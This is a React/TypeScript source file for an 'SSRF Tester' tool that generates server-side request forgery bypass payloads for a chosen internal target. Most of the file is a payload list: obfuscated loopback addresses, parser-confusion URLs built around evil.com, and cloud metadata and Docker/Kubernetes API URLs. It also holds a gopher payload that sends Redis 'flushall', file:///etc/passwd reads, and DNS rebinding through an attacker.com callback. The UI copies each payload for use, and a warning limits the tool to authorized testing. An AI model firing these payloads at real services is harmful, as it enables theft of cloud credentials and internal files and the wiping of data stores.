import React, { useState, useMemo } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faCopy, faCheck, faFilter, faNetworkWired, faExclamationTriangle, faPlay } from '@fortawesome/free-solid-svg-icons';
import type { SsrfTesterData, SsrfBypassTechnique, SsrfProtocol } from './tool-types';

type Props = {
  data: SsrfTesterData | undefined;
  onChange: (data: SsrfTesterData) => void;
};

type SsrfPayloadEntry = {
  name: string;
  template: string;
  technique: SsrfBypassTechnique;
  protocol: SsrfProtocol;
  description: string;
};

// IP conversion utilities
const ipToDecimal = (ip: string): string => {
  const parts = ip.split('.').map(Number);
  return String((parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3] >>> 0);
};

const ipToHex = (ip: string): string => {
  const parts = ip.split('.').map(n => parseInt(n).toString(16).padStart(2, '0'));
  return '0x' + parts.join('');
};

const ipToOctal = (ip: string): string => {
  const parts = ip.split('.').map(n => '0' + parseInt(n).toString(8));
  return parts.join('.');
};

const ipToOverflow = (ip: string): string => {
  const parts = ip.split('.').map(Number);
  // Add 256 to each octet (overflow)
  return parts.map(n => n + 256).join('.');
};

// SSRF bypass payload templates
const SSRF_PAYLOADS: SsrfPayloadEntry[] = [
  // Localhost variants
  { name: 'localhost', template: 'http://localhost/', technique: 'localhost-variants', protocol: 'http', description: 'Basic localhost' },
  { name: '127.0.0.1', template: 'http://127.0.0.1/', technique: 'localhost-variants', protocol: 'http', description: 'IPv4 loopback' },
  { name: '127.1', template: 'http://127.1/', technique: 'localhost-variants', protocol: 'http', description: 'Short form loopback' },
  { name: '127.0.1', template: 'http://127.0.1/', technique: 'localhost-variants', protocol: 'http', description: 'Another short form' },
  { name: '::1', template: 'http://[::1]/', technique: 'localhost-variants', protocol: 'http', description: 'IPv6 loopback' },
  { name: '::ffff:127.0.0.1', template: 'http://[::ffff:127.0.0.1]/', technique: 'localhost-variants', protocol: 'http', description: 'IPv6 mapped IPv4' },
  { name: '0.0.0.0', template: 'http://0.0.0.0/', technique: 'localhost-variants', protocol: 'http', description: 'All interfaces' },
  { name: '0', template: 'http://0/', technique: 'localhost-variants', protocol: 'http', description: 'Shortened zero' },
  { name: 'localtest.me', template: 'http://localtest.me/', technique: 'localhost-variants', protocol: 'http', description: 'Resolves to 127.0.0.1' },
  { name: 'spoofed.burpcollaborator', template: 'http://spoofed.burpcollaborator.net/', technique: 'localhost-variants', protocol: 'http', description: 'Custom DNS resolution' },

  // IP decimal conversion
  { name: 'Decimal IP', template: 'http://{DECIMAL_IP}/', technique: 'ip-decimal', protocol: 'http', description: 'IP as decimal number' },
  { name: 'Decimal with port', template: 'http://{DECIMAL_IP}:80/', technique: 'ip-decimal', protocol: 'http', description: 'Decimal IP with port' },

  // IP hex conversion
  { name: 'Hex IP', template: 'http://{HEX_IP}/', technique: 'ip-hex', protocol: 'http', description: 'IP as hexadecimal' },
  { name: 'Hex dotted', template: 'http://{HEX_DOTTED}/', technique: 'ip-hex', protocol: 'http', description: 'Each octet in hex' },

  // IP octal conversion
  { name: 'Octal IP', template: 'http://{OCTAL_IP}/', technique: 'ip-octal', protocol: 'http', description: 'IP as octal' },
  { name: 'Mixed octal', template: 'http://0177.0.0.1/', technique: 'ip-octal', protocol: 'http', description: 'Mixed octal notation' },

  // IP overflow
  { name: 'Overflow IP', template: 'http://{OVERFLOW_IP}/', technique: 'ip-overflow', protocol: 'http', description: 'Integer overflow bypass' },
  { name: '256 overflow', template: 'http://383.0.0.1/', technique: 'ip-overflow', protocol: 'http', description: '127+256 overflow' },

  // URL encoding tricks
  { name: 'URL encoded @', template: 'http://evil.com%40{TARGET}/', technique: 'url-encoding', protocol: 'http', description: 'Encoded @ symbol' },
  { name: 'URL encoded slash', template: 'http://{TARGET}%2f..%2f/', technique: 'url-encoding', protocol: 'http', description: 'Encoded path traversal' },
  { name: 'Double URL encode', template: 'http://%2531%2537%2532%252e%2530%252e%2530%252e%2531/', technique: 'url-encoding', protocol: 'http', description: 'Double URL encoding' },
  { name: 'Unicode dot', template: 'http://127。0。0。1/', technique: 'url-encoding', protocol: 'http', description: 'Unicode fullwidth dot' },
  { name: 'Punycode', template: 'http://xn--localhost/', technique: 'url-encoding', protocol: 'http', description: 'Punycode encoding' },

  // Parser differential
  { name: 'Backslash parser', template: 'http://evil.com\\@{TARGET}/', technique: 'parser-differential', protocol: 'http', description: 'Backslash confusion' },
  { name: 'Tab character', template: 'http://evil.com\t@{TARGET}/', technique: 'parser-differential', protocol: 'http', description: 'Tab in URL' },
  { name: 'CR/LF injection', template: 'http://evil.com%0d%0a@{TARGET}/', technique: 'parser-differential', protocol: 'http', description: 'CRLF in URL' },
  { name: 'Fragment bypass', template: 'http://evil.com#@{TARGET}/', technique: 'parser-differential', protocol: 'http', description: 'Fragment as host' },
  { name: 'Basic auth confusion', template: 'http://{TARGET}@evil.com/', technique: 'parser-differential', protocol: 'http', description: 'User@host confusion' },

  // Open redirect chains
  { name: 'Redirect chain', template: 'http://open-redirect.com?url=http://{TARGET}/', technique: 'redirect', protocol: 'http', description: 'Via open redirect' },
  { name: 'Data URI redirect', template: 'data:text/html,<script>location="http://{TARGET}"</script>', technique: 'redirect', protocol: 'http', description: 'Via data URI' },

  // TLD bypass
  { name: 'AWS metadata', template: 'http://169.254.169.254/latest/meta-data/', technique: 'tld-bypass', protocol: 'http', description: 'AWS metadata endpoint' },
  { name: 'GCP metadata', template: 'http://metadata.google.internal/computeMetadata/v1/', technique: 'tld-bypass', protocol: 'http', description: 'GCP metadata endpoint' },
  { name: 'Azure metadata', template: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', technique: 'tld-bypass', protocol: 'http', description: 'Azure metadata endpoint' },
  { name: 'Docker API', template: 'http://172.17.0.1:2375/containers/json', technique: 'tld-bypass', protocol: 'http', description: 'Docker API' },
  { name: 'Kubernetes API', template: 'http://kubernetes.default.svc/', technique: 'tld-bypass', protocol: 'http', description: 'K8s internal' },

  // Alternative protocols
  { name: 'Gopher', template: 'gopher://{TARGET}:_TCP_port/_payload', technique: 'parser-differential', protocol: 'gopher', description: 'Gopher protocol' },
  { name: 'Gopher Redis', template: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a', technique: 'parser-differential', protocol: 'gopher', description: 'Redis via Gopher' },
  { name: 'Dict', template: 'dict://{TARGET}:11211/stat', technique: 'parser-differential', protocol: 'dict', description: 'Dict protocol' },
  { name: 'File read', template: 'file:///etc/passwd', technique: 'parser-differential', protocol: 'file', description: 'File protocol' },
  { name: 'File Windows', template: 'file://c:/windows/win.ini', technique: 'parser-differential', protocol: 'file', description: 'Windows file read' },
  { name: 'LDAP', template: 'ldap://{TARGET}:389/', technique: 'parser-differential', protocol: 'ldap', description: 'LDAP protocol' },
  { name: 'FTP', template: 'ftp://{TARGET}/', technique: 'parser-differential', protocol: 'ftp', description: 'FTP protocol' },

  // DNS rebinding
  { name: 'DNS rebinding', template: 'http://1.1.1.1.1time.127.0.0.1.1time.repeat.rebind.it/', technique: 'dns-rebinding', protocol: 'http', description: 'DNS rebinding service' },
  { name: 'DNS rebind custom', template: 'http://r{RANDOM}.{TARGET}.{ATTACKER_DOMAIN}/', technique: 'dns-rebinding', protocol: 'http', description: 'Custom rebind domain' },
];

const TECHNIQUE_LABELS: Record<SsrfBypassTechnique, { label: string; color: string }> = {
  'ip-decimal': { label: 'IP Decimal', color: 'bg-blue-500/20 text-blue-400' },
  'ip-hex': { label: 'IP Hex', color: 'bg-green-500/20 text-green-400' },
  'ip-octal': { label: 'IP Octal', color: 'bg-cyan-500/20 text-cyan-400' },
  'ip-overflow': { label: 'IP Overflow', color: 'bg-purple-500/20 text-purple-400' },
  'dns-rebinding': { label: 'DNS Rebind', color: 'bg-red-500/20 text-red-400' },
  'url-encoding': { label: 'URL Encode', color: 'bg-yellow-500/20 text-yellow-400' },
  'parser-differential': { label: 'Parser Diff', color: 'bg-orange-500/20 text-orange-400' },
  'redirect': { label: 'Redirect', color: 'bg-pink-500/20 text-pink-400' },
  'tld-bypass': { label: 'Cloud Meta', color: 'bg-indigo-500/20 text-indigo-400' },
  'localhost-variants': { label: 'Localhost', color: 'bg-slate-500/20 text-slate-400' }
};

const PROTOCOL_LABELS: Record<SsrfProtocol, string> = {
  http: 'HTTP',
  https: 'HTTPS',
  gopher: 'Gopher',
  file: 'File',
  dict: 'Dict',
  ftp: 'FTP',
  ldap: 'LDAP'
};

const SsrfTester: React.FC<Props> = ({ data, onChange }) => {
  const internalTarget = data?.internalTarget ?? '127.0.0.1';
  const selectedTechnique = data?.selectedTechnique ?? 'all';
  const selectedProtocol = data?.selectedProtocol ?? 'all';
  const customCallbackUrl = data?.customCallbackUrl ?? '';
  const [copied, setCopied] = useState<string | null>(null);

  // Generate payloads based on target
  const generatedPayloads = useMemo(() => {
    const target = internalTarget || '127.0.0.1';
    const decimalIp = ipToDecimal(target);
    const hexIp = ipToHex(target);
    const hexDotted = target.split('.').map(n => '0x' + parseInt(n).toString(16)).join('.');
    const octalIp = ipToOctal(target);
    const overflowIp = ipToOverflow(target);

    return SSRF_PAYLOADS
      .filter(p => {
        if (selectedTechnique !== 'all' && p.technique !== selectedTechnique) return false;
        if (selectedProtocol !== 'all' && p.protocol !== selectedProtocol) return false;
        return true;
      })
      .map(p => {
        let payload = p.template
          .replace('{TARGET}', target)
          .replace('{DECIMAL_IP}', decimalIp)
          .replace('{HEX_IP}', hexIp)
          .replace('{HEX_DOTTED}', hexDotted)
          .replace('{OCTAL_IP}', octalIp)
          .replace('{OVERFLOW_IP}', overflowIp)
          .replace('{RANDOM}', Math.random().toString(36).substring(7))
          .replace('{ATTACKER_DOMAIN}', customCallbackUrl || 'attacker.com');

        return { ...p, payload };
      });
  }, [internalTarget, selectedTechnique, selectedProtocol, customCallbackUrl]);

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
    setCopied(payload);
    setTimeout(() => setCopied(null), 2000);
  };

  const techniqueCounts = useMemo(() => {
    const counts: Record<string, number> = {};
    SSRF_PAYLOADS.forEach(p => {
      counts[p.technique] = (counts[p.technique] || 0) + 1;
    });
    return counts;
  }, []);

  return (
    <div className="flex flex-col h-full text-xs">
      <div className="flex items-center justify-between mb-2">
        <div className="text-slate-200 font-medium">SSRF Tester</div>
        <div className="text-[10px] text-slate-500">
          {generatedPayloads.length} / {SSRF_PAYLOADS.length} payloads
        </div>
      </div>

      <div className="text-[10px] text-slate-500 mb-2">
        <FontAwesomeIcon icon={faNetworkWired} className="w-2.5 h-2.5 mr-1" />
        SSRF bypass payloads with IP obfuscation and protocol tricks
      </div>

      {/* Target IP */}
      <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-2">
        <label className="text-[10px] text-slate-500 mb-1 block">Internal Target IP</label>
        <input
          type="text"
          value={internalTarget}
          onChange={(e) => onChange({ ...data, internalTarget: e.target.value })}
          placeholder="127.0.0.1"
          className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700 font-mono focus:outline-none focus:border-blue-500"
        />
        <div className="flex gap-2 mt-1">
          <button
            onClick={() => onChange({ ...data, internalTarget: '127.0.0.1' })}
            className="text-[9px] text-blue-400 hover:text-blue-300"
          >
            localhost
          </button>
          <button
            onClick={() => onChange({ ...data, internalTarget: '169.254.169.254' })}
            className="text-[9px] text-blue-400 hover:text-blue-300"
          >
            AWS meta
          </button>
          <button
            onClick={() => onChange({ ...data, internalTarget: '10.0.0.1' })}
            className="text-[9px] text-blue-400 hover:text-blue-300"
          >
            internal
          </button>
        </div>
      </div>

      {/* Filters */}
      <div className="flex gap-2 mb-2">
        <div className="flex-1 rounded border border-slate-700 bg-slate-800/30 p-2">
          <div className="flex items-center gap-1 mb-1">
            <FontAwesomeIcon icon={faFilter} className="w-2.5 h-2.5 text-slate-500" />
            <label className="text-[9px] text-slate-500">Bypass Technique</label>
          </div>
          <select
            value={selectedTechnique}
            onChange={(e) => onChange({ ...data, selectedTechnique: e.target.value as SsrfBypassTechnique | 'all' })}
            className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700"
          >
            <option value="all">All Techniques ({SSRF_PAYLOADS.length})</option>
            {(Object.keys(TECHNIQUE_LABELS) as SsrfBypassTechnique[]).map(tech => (
              <option key={tech} value={tech}>
                {TECHNIQUE_LABELS[tech].label} ({techniqueCounts[tech] || 0})
              </option>
            ))}
          </select>
        </div>
        <div className="w-24 rounded border border-slate-700 bg-slate-800/30 p-2">
          <label className="text-[9px] text-slate-500 block mb-1">Protocol</label>
          <select
            value={selectedProtocol}
            onChange={(e) => onChange({ ...data, selectedProtocol: e.target.value as SsrfProtocol | 'all' })}
            className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700"
          >
            <option value="all">All</option>
            {(Object.keys(PROTOCOL_LABELS) as SsrfProtocol[]).map(proto => (
              <option key={proto} value={proto}>{PROTOCOL_LABELS[proto]}</option>
            ))}
          </select>
        </div>
      </div>

      {/* Callback URL */}
      <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-2">
        <label className="text-[10px] text-slate-500 mb-1 block">Callback URL (for OOB detection)</label>
        <input
          type="text"
          value={customCallbackUrl}
          onChange={(e) => onChange({ ...data, customCallbackUrl: e.target.value })}
          placeholder="your-burp-collaborator.net"
          className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700 font-mono focus:outline-none focus:border-blue-500"
        />
      </div>

      {/* Generated Payloads */}
      <div className="flex-1 overflow-y-auto space-y-1.5 min-h-0">
        {generatedPayloads.map((p, i) => (
          <div
            key={i}
            className="rounded border border-slate-700 bg-slate-800/30 p-2"
          >
            <div className="flex items-center justify-between mb-1">
              <div className="flex items-center gap-2">
                <span className={`text-[8px] px-1.5 py-0.5 rounded ${TECHNIQUE_LABELS[p.technique].color}`}>
                  {TECHNIQUE_LABELS[p.technique].label}
                </span>
                <span className="text-[8px] px-1.5 py-0.5 rounded bg-slate-600/30 text-slate-400">
                  {PROTOCOL_LABELS[p.protocol]}
                </span>
                <span className="text-slate-300 text-[10px]">{p.name}</span>
              </div>
              <button
                onClick={() => copyPayload(p.payload)}
                className="rounded bg-slate-800 px-2 py-0.5 text-[9px] text-slate-300 hover:bg-slate-700 transition-colors flex items-center gap-1"
              >
                <FontAwesomeIcon icon={copied === p.payload ? faCheck : faCopy} className="w-2 h-2" />
                {copied === p.payload ? 'Copied!' : 'Copy'}
              </button>
            </div>
            <div className="text-[9px] text-slate-500 mb-1">{p.description}</div>
            <pre className="text-[9px] text-slate-400 bg-slate-800/50 p-1.5 rounded font-mono overflow-x-auto whitespace-nowrap">
              {p.payload}
            </pre>
          </div>
        ))}
        {generatedPayloads.length === 0 && (
          <div className="text-center text-slate-500 text-[10px] py-8">
            No payloads match the current filters
          </div>
        )}
      </div>

      <div className="rounded border border-yellow-500/30 bg-yellow-900/20 p-2 mt-2 text-[9px] text-yellow-400">
        <FontAwesomeIcon icon={faExclamationTriangle} className="w-2.5 h-2.5 mr-1" />
        <strong>Warning:</strong> Authorized security testing only.
      </div>
    </div>
  );
};

export class SsrfTesterTool {
  static Component = SsrfTester;
}
